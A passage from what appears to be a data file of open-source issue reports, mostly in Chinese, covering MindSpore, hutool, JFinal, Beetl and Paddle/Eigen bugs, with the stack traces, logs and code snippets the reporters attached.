[mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Minimum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.931.551 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Minimum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:55.028.179 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Maximum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:55.028.213 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Maximum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:55.156.351 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:493] SelectKernelInfo] The node [kernel_graph_8:[CNode]21{[0]: ValueNode&lt;PrimitivePy&gt; Cast, [1]: [Parameter]22}] cannot find valid TBE kernel info, try to get aicpu kernel info [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:55.194.031 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:55.194.061 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:59.536.275 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:59.536.327 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:59.667.719 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:59.667.747 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:59.805.014 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:493] SelectKernelInfo] The node [kernel_graph_158:[CNode]438{[0]: ValueNode&lt;PrimitivePy&gt; Cast, [1]: [Parameter]439}] cannot find valid TBE kernel info, try to get aicpu kernel info [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:00.803.490 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:00.803.533 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:00.919.479 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:00.919.510 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] PRE_ACT(118751,fffea17f41e0,python):2021-11-03-09:26:20.315.421 [mindspore/ccsrc/backend/optimizer/common/helper.cc:235] CreateTupleTensor] The value 0xaaaaf2315e40of tuple is not a scalar [WARNING] PRE_ACT(118751,fffea17f41e0,python):2021-11-03-09:26:20.315.471 [mindspore/ccsrc/backend/optimizer/pass/convert_const_input_to_tensor_input.cc:46] CreateTensorInput] Create tensor failed [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.354.137 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.354.171 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.454.666 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.454.728 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.454.746 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.454.760 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.454.775 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.454.789 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.454.803 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.544.602 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Minimum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.544.635 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Minimum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.624.844 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Maximum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.624.876 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Maximum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.725.653 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.725.710 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.829.121 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.829.165 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.829.183 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.829.198 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.829.212 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.829.226 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.829.240 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.923.738 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Minimum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:20.923.768 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Minimum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:21.015.093 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Maximum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:21.015.166 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Maximum]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:24.158.046 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[ScatterNd]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:24.158.095 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[ScatterNd]reduce precision from int64 to int32 [WARNING] PRE_ACT(118751,fffea17f41e0,python):2021-11-03-09:26:31.779.824 [mindspore/ccsrc/backend/optimizer/common/helper.cc:235] CreateTupleTensor] The value 0xaaaafcc90da0of tuple is not a scalar [WARNING] PRE_ACT(118751,fffea17f41e0,python):2021-11-03-09:26:31.779.885 [mindspore/ccsrc/backend/optimizer/pass/convert_const_input_to_tensor_input.cc:46] CreateTensorInput] Create tensor failed [WARNING] PRE_ACT(118751,fffea17f41e0,python):2021-11-03-09:26:31.786.616 [mindspore/ccsrc/backend/optimizer/common/helper.cc:235] CreateTupleTensor] The value 0xaaaaf2315e40of tuple is not a scalar [WARNING] PRE_ACT(118751,fffea17f41e0,python):2021-11-03-09:26:31.786.675 [mindspore/ccsrc/backend/optimizer/pass/convert_const_input_to_tensor_input.cc:46] CreateTensorInput] Create tensor failed [ERROR] KERNEL(118751,fffea17f41e0,python):2021-11-03-09:26:31.996.246 [mindspore/ccsrc/backend/kernel_compiler/kernel_query.cc:95] KernelQueryAll] Can not find any available operator info for op [fake_bprop, Default/fake_bprop-op3096]. Node DebugString:kernel_graph_719:[CNode]529{[0]: ValueNode&lt;Primitive&gt; fake_bprop, [1]: [Parameter]530}, maybe the operator can not supported on current platform. trace Traceback (most recent call last): File ""train.py"", line 209, in &lt;module&gt; netD_loss, netG_loss = transgan(real, noise) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/ma-user/work/TransGAN/src/transgan.py"", line 28, in construct output_D = ops.Reshape()(self.myTrainOneStepCellForD(real_data, latent_code), (-1,)) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in __call__ output = self.run_construct(cast_inputs, kwargs) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py"", line 392, in construct grads = self.grad(self.network, self.weights)(*inputs, sens) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 377, in after_grad out = _pynative_exec(fn, *args, **kwargs) File ""/home/ma-user/miniconda3/envs/MindSpore-python3.7-aarch64/lib/python3.7/site-packages/mindspore/common/api.py"", line 425, in __call__ return self._executor(obj, args) RuntimeError: mindspore/ccsrc/backend/kernel_compiler/kernel_query.cc:95 KernelQueryAll] Can not find any available operator info for op [fake_bprop, Default/fake_bprop-op3096]. Node DebugString:kernel_graph_719:[CNode]529{[0]: ValueNode&lt;Primitive&gt; fake_bprop, [1]: [Parameter]530}, maybe the operator can not supported on current platform. trace # [ERROR] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:26:32.361.136 [mindspore/ccsrc/runtime/device/ascend/ascend_memory_manager.cc:108] FreeDeviceMemory] rtFree mem size[32212254720] fail, ret[507899]"
db 处理缺陷 ,"JDK版本： openjdk_8_201 hutool版本： 5.4.2   <code>: 数据库字段类型 tinyint 我目前值 1，2，3，4 使用 List&lt;Entity&gt; entityList =SqlExecutor.query(conn, sql, new EntityListHandler()); Entity 中拿到此字段 全部为 true 导致拿错值"
[MS][net]pip version specified in shell,": /device ascend : -- MindSpore version : commit_id__ = ''[sha1]:afb83758,[branch]:(HEAD,origin/r1.5,r1.5)' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_fasterrcnn_mindir_reduce_310infer install mindspore start infer infer failed infer success run_infer_310.sh build.sh shell 脚本中大量这种写死python和pip版本的地方，导致执行失败，请统一排查，不仅仅当前网络   <code>: CMake Generate step failed. Build files cannot be regenerated correctly. Scanning dependencies of target main [ 33%] Building CXX object CMakeFiles/main.dir/src/main.cc.o /home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/fasterrcnn/test_ms_fasterrcnn_mindir_500P_310infer/ascend310_infer/src/main.cc:27:10: fatal error: include/api/context.h: No such file or directory #include ""include/api/context.h"" ^~~~~~~~~~~~~~~~~~~~~~~ compilation terminated. CMakeFiles/main.dir/build.make:81: recipe for target 'CMakeFiles/main.dir/src/main.cc.o' failed function cal_acc() { python3.7 ../postprocess.py --anno_path=$anno_path --result_path=./result_Files &amp;&gt; acc.log &amp; } cmake .. \ -DMINDSPORE_PATH=""`pip3.7 show mindspore-ascend | grep Location | awk '{print $2""/mindspore""}' | xargs realpath`"""
关于封装的ajax data数组对象格式问题,"你好，使用封装的ajax，请求数据对象时，格式好象有问题。如下图： 数组中对象属性应该是subDict[0].name,而不是subDict[0][name]，后者这种格式springmvc解析不了。 我想把字典表操作的数据格式调整下： 这里直接使用ajax.setData数据格式也不对。   <code>: DictInfoDlg.collectData = function () { this.clearNullDom(); var arr = new Array(); $(""[name='dictItem']"").each(function(){ var sub = { ""name"" : $(this).find(""[name='itemName']"").val(), ""code"" : $(this).find(""[name='itemCode']"").val(), ""val"" : $(this).find(""[name='itemVal']"").val() }; arr.push(sub); }); this.dictName = $(""#dictName"").val(); this.dictCode = $(""#dictCode"").val(); this.subDict = arr; }; DictInfoDlg.addSubmit = function () { this.collectData(); //提交信息 var ajax = new $ax(Feng.ctxPath + ""/dict/add1"", function (data) { Feng.success(""添加成功!""); window.parent.Dict.table.refresh(); DictInfoDlg.close(); }, function (data) { Feng.error(""添加失败!"" + data.responseJSON.message + ""!""); }); var data = new Object(); data.dictName = this.dictName; data.dictCode = this.dictCode; data.dictValues = this.dictValues; data.subDict = this.subDict; // ajax.set('dictName',this.dictName); // ajax.set('dictCode',this.dictCode); // ajax.set('dictValues',this.mutiString); // ajax.set('subDict',subDict); ajax.setData(data); ajax.start(); };"
undertow.devMode=true导致的类型转换问题,"版本信息 JFinal 4.9.12 jfinal-undertow 2.5 自己封装了一个jar包,jar中中有个top.ppnt.jfinal.swaager.api.config.SwaggerRoute类,继承自com.jfinal.config.Routes 使用maven命令启动运行正常 添加源码到eclipse中运动正常 top.ppnt.jfinal.swaager.api.config.SwaggerRoute所向的项目源码导入到eclipse eclipse会自动引用eclipse中工程的源码而是jar包 安装jar包到本地出现错误 但是关闭工程,引用jar包则会出现上面错误 启动项目时出现下面的错误 在windows取消代码验证 -Xverify:none 重新启动 出现下面错误 最终发现是开启了undertow.devMode导致的该错误,关闭热加载,启动正常 获取开启undertow.devMode=false将 top.ppnt.jfinal.swaager.api.config.SwaggerRoute重名为com.jfinal.swaager.api.config.SwaggerRoute该错误也不会出现 通过分析源码发现Routes 使用abstract 修饰   <code>: mvn compile exec:java -Dexec.mainClass=""top.ppnt.jfinal.swagger.PpntSwaggerApp"" Starting JFinal 4.9.12 -&gt; http://0.0.0.0:8000/jfinal-4.9-jfinal-swagger-api Info: jfinal-undertow 2.5, undertow 2.0.34.Final, jvm 1.8.0_121 11:14:00.673 [main] DEBUG org.jboss.logging - Logging Provider: org.jboss.logging.Slf4jLoggerProvider 11:14:00.729 [main] DEBUG io.undertow.session - Setting default session timeout to 1800 11:14:00.733 [main] DEBUG io.undertow.session - Registered session listener io.undertow.servlet.core.SessionListenerBridge@2752f6e2 Exception in thread ""main"" java.lang.VerifyError: Bad type on operand stack Exception Details: Location: com/litongjava/jfinal/swagger/AppConfig.configRoute(Lcom/jfinal/config/Routes;)V @35: invokevirtual Reason: Type 'top/ppnt/jfinal/swagger/config/SwaggerRoute' (current frame, stack[1]) is not assignable to 'com/jfinal/config/Routes' Current Frame: bci: @35 flags: { } locals: { 'com/litongjava/jfinal/swagger/AppConfig', 'com/jfinal/config/Routes', 'java/lang/String' } stack: { 'com/jfinal/config/Routes', 'top/ppnt/jfinal/swagger/config/SwaggerRoute' } Bytecode: 0x0000000: 1210 4d2b bb00 1259 2cb8 0014 b700 1a12 0x0000010: 1db6 001f b600 23b6 0027 572b bb00 2d59 0x0000020: b700 2fb6 0030 57b1 at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:264) at com.jfinal.core.JFinalFilter.createJFinalConfig(JFinalFilter.java:126) at com.jfinal.core.JFinalFilter.init(JFinalFilter.java:61) at io.undertow.servlet.core.LifecyleInterceptorInvocation.proceed(LifecyleInterceptorInvocation.java:111) at io.undertow.servlet.core.ManagedFilter.createFilter(ManagedFilter.java:80) at io.undertow.servlet.core.DeploymentManagerImpl$2.call(DeploymentManagerImpl.java:591) at io.undertow.servlet.core.DeploymentManagerImpl$2.call(DeploymentManagerImpl.java:556) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:42) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.core.DeploymentManagerImpl.start(DeploymentManagerImpl.java:598) at com.jfinal.server.undertow.UndertowServer.configHttp(UndertowServer.java:287) at com.jfinal.server.undertow.UndertowServer.doStart(UndertowServer.java:265) at com.jfinal.server.undertow.UndertowServer.start(UndertowServer.java:158) at com.jfinal.server.undertow.UndertowServer.start(UndertowServer.java:83) at com.litongjava.jfinal.swagger.SwaagerApp.main(SwaagerApp.java:7) Starting JFinal 4.9.12 -&gt; http://127.0.0.1:8000/jfinal-4.9-ppnt-jfinal-swagger-api Info: jfinal-undertow 2.5, undertow 2.0.34.Final, jvm 1.8.0_121 java.lang.ClassCastException: top.ppnt.jfinal.swaager.api.config.SwaggerRoute cannot be cast to com.jfinal.config.Routes undertow.devMode=false /** * Routes. */ public abstract class Routes {"
Hard to manipulate `Eigen::DSizes` when rank of dimension is dynamic,"The of a tensor could be set by user configuration with type . However, the of is a template argument. It must be decided when compiling C++ but is a runtime method. It is hard to cast to . For example, the operator's shape is configured by a user, and Paddle reads that attribute in runtime. That attribute is a . To cast to , the code could be We may provide a proper way to manipulate . It could be just like to . Create a type as a alias of Use to access . The logic could be   <code>: template &lt;size_t N&gt; using EigenDim = Eigen::DSizes&lt;Eigen::DenseIndex, N&gt;; rank std::vector&lt;int&gt; rank Eigen::DSizes std::vector&lt;int&gt;::size() std::vector&lt;int&gt; Eigen::DSizes reshape vector&lt;int&gt; vector&lt;int&gt; EigenDim vector&lt;int&gt; dim_attr; switch(dim_attr.size()) { case 1: out_tensor.reshape(EigenDim&lt;1&gt;(dim_attr)); break; case 2: out_tensor.reshape(EigenDim&lt;2&gt;(dim_attr)); break; ... } EigenDim&lt;N&gt; DDim Dim EigenDDim boost::variable&lt;EigenDim&lt;1&gt;, ...&gt; boost::static_visitor EigenDim&lt;N&gt; reshape struct ReshapeVisitor : public boost::static_visitor&lt;void&gt; { ReshapeVisitor(EigenTensor&amp; tensor) : tensor_(tensor) {} EigenTensor&amp; tensor_; template &lt;typename EigenDim&gt; void operator()(const EigenDim&amp; dim) const { tensor_.reshape(dim); } }; vector&lt;int&gt; dim_attr; EigenDDim ddim(dim_attr); boost::apply(ReshapeVisitor(out_tensor), ddim);"
HttpRequest类重定向设置,此方法参数 isFollowRedirects 有什么意义   <code>: public HttpRequest setFollowRedirects(Boolean isFollowRedirects) { return setMaxRedirectCount(2); }
construct函数支持return dict,"目前在graph mode下，construct函数return dict的方式为，其中为dict类型，并且在construct中为dict，在construct外为dict的values。 希望能够真的支持return dict，在construct内外都是，其中为dict类型。   <code>: return d, d.keys() d return d d"
org.beetl.core.exception.BeetlException: 根据参数未找到匹配的方法escapeHtml(String),"org.beetl.core.exception.BeetlException: 根据参数未找到匹配的方法escapeHtml(String) at org.beetl.core.statement.NativeCallExpression.evaluate(NativeCallExpression.java:171) at org.beetl.core.statement.PlaceholderST.execute(PlaceholderST.java:34) at org.beetl.core.statement.BlockStatement.execute(BlockStatement.java:68) at org.beetl.core.Tag.doBodyRender(Tag.java:60) at org.beetl.core.Tag.getBodyContent(Tag.java:69) at org.beetl.ext.tag.LayoutTag.render(LayoutTag.java:104) at org.beetl.core.statement.TagStatement.runTag(TagStatement.java:108) at org.beetl.core.statement.TagStatement.execute(TagStatement.java:87) at org.beetl.core.statement.BlockStatement.execute(BlockStatement.java:68) at org.beetl.core.statement.IfStatement.execute(IfStatement.java:69) at org.beetl.core.statement.Program.execute(Program.java:70) at org.beetl.core.engine.FilterProgram.execute(FilterProgram.java:31) at org.beetl.core.Template.renderTo(Template.java:136) at org.beetl.core.Template.renderTo(Template.java:89) at org.beetl.ext.web.WebRender.render(WebRender.java:125) at org.beetl.ext.spring.BeetlSpringView.renderMergedTemplateModel(BeetlSpringView.java:123) at com.jeesite.common.beetl.view.BeetlView.renderMergedTemplateModel(jf:216) at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:167) at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303) at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1286) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1041) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:984) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:728) at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:472) at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:395) at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:316) at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:395) at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:254) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:177) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) 03-14 10:31:46.060 ERROR [o.a.c.core.ContainerBase.[Tomcat].[localhost]] - Exception Processing ErrorPage[errorCode=404, location=/error/404] org.springframework.web.util.NestedServletException: Request processing failed; nested exception is 10:31:46:本地调用不合法，找不到类或者方法(NATIVE_CALL_INVALID):EncodeUtils 位于34行 资源:/views/error/404.html 根据参数未找到匹配的方法escapeHtml(String) 31| Caused by: org.beetl.core.exception.BeetlException: NATIVE_CALL_INVALID at com.jeesite.common.beetl.handler.LoggerErrorHandler.processExcption(on:81) at org.beetl.core.Template.renderTo(Template.java:169) at org.beetl.core.Template.renderTo(Template.java:89) at org.beetl.ext.web.WebRender.render(WebRender.java:125) at org.beetl.ext.spring.BeetlSpringView.renderMergedTemplateModel(BeetlSpringView.java:123) at com.jeesite.common.beetl.view.BeetlView.renderMergedTemplateModel(jf:216) at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:167) at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303) at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1286) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1041) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:984) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) ... 25 common frames omitted Caused by: org.beetl.core.exception.BeetlException: 根据参数未找到匹配的方法escapeHtml(String) at org.beetl.core.statement.NativeCallExpression.evaluate(NativeCallExpression.java:171) at org.beetl.core.statement.PlaceholderST.execute(PlaceholderST.java:34) at org.beetl.core.statement.BlockStatement.execute(BlockStatement.java:68) at org.beetl.core.Tag.doBodyRender(Tag.java:60) at org.beetl.core.Tag.getBodyContent(Tag.java:69) at org.beetl.ext.tag.LayoutTag.render(LayoutTag.java:104) at org.beetl.core.statement.TagStatement.runTag(TagStatement.java:108) at org.beetl.core.statement.TagStatement.execute(TagStatement.java:87) at org.beetl.core.statement.BlockStatement.execute(BlockStatement.java:68) at org.beetl.core.statement.IfStatement.execute(IfStatement.java:69) at org.beetl.core.statement.Program.execute(Program.java:70) at org.beetl.core.engine.FilterProgram.execute(FilterProgram.java:31) at org.beetl.core.Template.renderTo(Template.java:136) ... 36 common frames omitted 访问登录界面报错！！！   <code>: at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:982) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:728) at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:472) at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:395) at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:316) at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:395) at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:254) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:177) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459) at 